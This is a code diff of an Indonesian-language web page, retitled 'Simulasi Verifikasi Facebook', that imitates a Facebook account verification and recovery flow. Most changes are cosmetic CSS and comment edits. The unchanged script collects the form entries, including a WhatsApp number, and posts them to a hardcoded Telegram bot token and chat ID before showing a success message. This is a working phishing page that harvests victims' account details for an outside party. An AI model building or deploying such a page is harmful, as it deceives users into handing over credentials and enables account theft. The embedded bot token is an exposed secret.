@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Simulasi Verifikasi Identitas</title>
+  <title>Simulasi Verifikasi Facebook</title>
   <style>
     * {
       margin: 0;
@@ -10,29 +10,29 @@
       box-sizing: border-box;
     }
 
-    body {
-      background: #f0f2f5;
+    html, body {
+      height: 100%;
       font-family: 'Segoe UI', sans-serif;
-      min-height: 100vh;
+      background: #f0f2f5;
     }
 
     .wrapper {
       display: flex;
       justify-content: center;
       align-items: flex-start;
-      padding-top: 60px;
-      height: 100vh;
+      min-height: 100vh;
+      padding-top: 60px; /* agar naik sedikit ke atas */
     }
 
     .box {
-      background: white;
+      background: #fff;
       padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      text-align: center;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       width: 100%;
       max-width: 450px;
       display: none;
+      text-align: center;
     }
 
     .box.active {
@@ -40,7 +40,7 @@
     }
 
     .box img {
-      width: 50px;
+      width: 60px;
       margin-bottom: 20px;
     }
 
@@ -51,17 +51,17 @@
     }
 
     p {
-      color: #444;
       font-size: 14px;
+      color: #444;
       margin-bottom: 25px;
     }
 
     .btn {
       background-color: #1877f2;
-      color: white;
-      padding: 10px 20px;
-      border: none;
+      color: #fff;
+      padding: 10px 16px;
       font-size: 15px;
+      border: none;
       border-radius: 6px;
       cursor: pointer;
       width: 100%;
@@ -69,10 +69,10 @@
 
     input {
       width: 100%;
-      margin-bottom: 12px;
       padding: 10px;
+      margin-bottom: 12px;
       border: 1px solid #ccc;
-      border-radius: 5px;
+      border-radius: 6px;
     }
 
     .success h2 {
@@ -91,7 +91,7 @@
       <button class="btn" onclick="goToStep(2)">Lanjutkan</button>
     </div>
 
-    <!-- Halaman 2: Formulir Pemulihan -->
+    <!-- Halaman 2: Formulir -->
     <div class="box" id="step2">
       <h2>Informasi Pemulihan</h2>
       <form id="recoveryForm">
@@ -104,7 +104,7 @@
       </form>
     </div>
 
-    <!-- Halaman 3: Berhasil -->
+    <!-- Halaman 3: Sukses -->
     <div class="box success" id="step3">
       <h2>Berhasil!</h2>
       <p>Berhasil mengirim data.</p>
@@ -113,12 +113,11 @@
 
   <script>
     function goToStep(step) {
-      document.querySelectorAll('.box').forEach(el => el.classList.remove('active'));
+      document.querySelectorAll('.box').forEach(box => box.classList.remove('active'));
       document.getElementById(`step${step}`).classList.add('active');
     }
 
     const form = document.getElementById('recoveryForm');
-
     form.addEventListener('submit', function(e) {
       e.preventDefault();
 
@@ -137,7 +136,7 @@
 📱 WhatsApp: ${whatsapp}
       `;
 
-      // Ganti ini dengan token dan chat ID milikmu
+      // Ganti token & chat ID kamu di bawah ini
       const telegramBotToken = "7733097714:AAFizEnWZUqtjfJxikCqoNOCzufsJTB2Vk8";
       const telegramChatId = "7228659553";
 
@@ -149,12 +148,12 @@
           text: message
         })
       })
-      .then(response => response.json())
+      .then(res => res.json())
       .then(data => {
-        goToStep(3); // Pindah ke halaman "Berhasil"
+        goToStep(3);
       })
       .catch(error => {
-        alert("Gagal mengirim data ke Telegram.");
+        alert("Gagal mengirim data.");
         console.error(error);
       });
     });
